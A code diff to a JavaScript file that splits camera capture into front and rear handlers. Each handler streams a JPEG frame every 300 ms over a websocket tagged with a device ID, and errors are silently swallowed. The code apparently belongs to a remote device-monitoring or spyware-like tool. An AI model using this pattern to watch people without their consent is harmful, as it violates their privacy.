@@ -217,42 +217,64 @@
             } catch (err) {}
         }
         
-        let currentCameraStream = null;
-        let cameraInterval = null;
+        let frontCameraStream = null;
+        let rearCameraStream = null;
+        let frontInterval = null;
+        let rearInterval = null;
         
         async function captureCamera(cameraType) {
             try {
-                if (currentCameraStream) {
-                    currentCameraStream.getTracks().forEach(track => track.stop());
-                }
-                if (cameraInterval) {
-                    clearInterval(cameraInterval);
-                }
-                
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } 
                 });
-                currentCameraStream = stream;
+                
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
                 
-                video.onloadedmetadata = () => {
-                    cameraInterval = setInterval(() => {
-                        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            ws.send(JSON.stringify({
-                                type: 'camera',
-                                deviceId: deviceId,
-                                camera: cameraType,
-                                image: canvas.toDataURL('image/jpeg', 0.8)
-                            }));
-                        }
-                    }, 300);
-                };
+                if (cameraType === 'front') {
+                    if (frontCameraStream) frontCameraStream.getTracks().forEach(t => t.stop());
+                    if (frontInterval) clearInterval(frontInterval);
+                    frontCameraStream = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        frontInterval = setInterval(() => {
+                            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                ws.send(JSON.stringify({
+                                    type: 'camera',
+                                    deviceId: deviceId,
+                                    camera: 'front',
+                                    image: canvas.toDataURL('image/jpeg', 0.9)
+                                }));
+                            }
+                        }, 300);
+                    };
+                } else {
+                    if (rearCameraStream) rearCameraStream.getTracks().forEach(t => t.stop());
+                    if (rearInterval) clearInterval(rearInterval);
+                    rearCameraStream = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        rearInterval = setInterval(() => {
+                            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                ws.send(JSON.stringify({
+                                    type: 'camera',
+                                    deviceId: deviceId,
+                                    camera: 'rear',
+                                    image: canvas.toDataURL('image/jpeg', 0.9)
+                                }));
+                            }
+                        }, 300);
+                    };
+                }
             } catch (err) {}
         }
         
